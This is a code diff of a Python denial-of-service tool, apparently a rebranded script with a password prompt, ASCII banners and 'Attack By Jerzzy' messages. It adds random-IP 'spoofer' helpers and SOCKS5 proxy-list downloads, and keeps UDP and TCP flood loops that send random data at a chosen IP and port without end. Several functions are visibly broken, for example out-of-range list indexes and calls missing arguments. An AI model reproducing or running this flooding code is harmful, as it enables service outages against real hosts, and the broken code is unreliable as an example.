@@ -9,7 +9,7 @@ from os import system, name
 import requests
 
 os.system("clear")
-password ='vanny'
+password ='sir'
 
 print("""\033[36m                              
  __         ______     ______     __     __   __    
@@ -19,7 +19,7 @@ print("""\033[36m
   \/_____/   \/_____/   \/_____/   \/_/   \/_/ \/_/ 
 """)
 
-for i in range(100):
+for i in range(450):
     pwd = input("[€] Enter Account : ")
     j=3
     if(pwd==password):
@@ -61,53 +61,114 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
+def randomip():
+  randip = []
+  randip1 = random.randint(1,255)
+  randip2 = random.randint(1,255)
+  randip3 = random.randint(1,255)
+  randip4 = random.randint(1,255)
+  randip5 = random.randint(1,255)
+  randip6 = random.randint(1,255)
+  randip7 = random.randint(1,255)
+  randip8 = random.randint(1,255)
 
-os.system("clear")
-print("""\033[91m
-░█████╗░██╗░░░██╗░█████╗░███╗░░██╗
-██╔══██╗╚██╗░██╔╝██╔══██╗████╗░██║
-██║░░╚═╝░╚████╔╝░██║░░██║██╔██╗██║
-██║░░██╗░░╚██╔╝░░██║░░██║██║╚████║
-╚█████╔╝░░░██║░░░╚█████╔╝██║░╚███║
-░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝""")
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  randip.append(randip5)
+  randip.append(randip6)
+  randip.append(randip7)
+  randip.append(randip8)
+  
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+  
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    addr[4] = str(random.randrange(2, 256))
+    addr[5] = str(random.randrange(2, 254))
+    addr[6] = str(random.randrange(2, 256))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
+    return assemebled
+
+def getproxy():
+    global proxies
+    f = open(f'{nprox}.txt','wb')
+    r = requests.get(urlproxy)
+    f.write(r.content)
+    f.close()
+    proxies = open(f'{nprox}.txt').readlines()
+
+def proxyask():
+    global urlproxy
+    pro = input(f'[~] Get New List {nprox} [Y] : ')
+    if pro == "Y":
+        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
+        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
+        getproxy()
+        askthreads()
+    else:
+        proxyask() 
+
+print ("\033[32m                      ╔══════════════════════════════════════╗")
+print ("\033[32m                      ║\033[33m ╦  ╔═╗╦ ╦╦  ╦╔╦╗\033[32m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[32m║")
+print ("\033[32m                      ║\033[33m ║  ╠═╣╚╦╝║  ║ ║ \033[32m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[32m║")
+print ("\033[32m                      ║\033[33m ╩═╝╩ ╩ ╩ ╩═╝╩ ╩ \033[32m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[32m║")
+print ("\033[32m                      ╚══════════════════════════════════════╝")
+print ("\033[32m                          ║\033[31m      LAYLIT ATTACK RUN        \033[32m║")
+print ("\033[32m                       ╔════════════════════════════════════╗")                                   
+print ("\033[32m                       ║\033[33m   IP TARGET    \033[32m║   \033[32m PORT TARGET    \033[32m║")
+print ("\033[32m                       ║ ══════════════════════════════════ ║")
+print ("\033[32m                       ║\033[31m %s\033[32m ║      \033[31m%s         \033[32m║")  
+print ("\033[32m                       ╚════════════════════════════════════╝")
+print ("\033[32m                               ╔═══════════════════╗")
+print ("\033[32m                               ║\033[31m    SUBS YT \033[37mJERZZY   \033[32m║")
+print ("\033[32m                               ╚═══════════════════╝")
+
 print("\033[36m")         
-ip = str(input("HOST/IP: "))
+ip = str(input("IP: "))
 port = int(input("PORT : "))
 choice = str(input("METHODS UDP / TCP : "))
 times = int(input("PACKETS : "))
 threads = int(input("THREADS : "))
 os.system("clear")
 def run():
-	data = random._urandom(10872)
-	i = random.choice(("[☂]","[☂]","[☂]"))
+	data = random._urandom(666)
+	i = random.choice(("[!]","[!]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack By Vanny")
+			print(i +" Attack By Jerzzy")
 		except:
 		    os.close()
 		    print("Down!!!")
 			    
 def run2():
-	data = random._urandom(668)
-	i = random.choice(("[☂]","[☂]","[☂]"))
+	data = random._urandom(102400)
+	i = random.choice(("[!]","[!]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			addr =(str(ip),int(port))
 			for x in range(times):
 				s.send(data)
-			print(i +" Attack By ZXZ")
+			print(i +" Attack By Jerzzy")
 		except:
 		    s.close()
 		    print("Down!!!")
 			
 def run3():
     global useragents, ref, acceptall
-    hh = random._urandom(32106)
+    hh = random._urandom()
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
@@ -188,7 +249,7 @@ def exit_gracefully(signum, frame):
             byebye()
 
     except KeyboardInterrupt:
-        print("Ok ok, quitting")
+        print("Terimakasih Telah Memakai Tools Ini")
         byebye()
         
     signal.signal(signal.SIGINT, exit_gracefully)
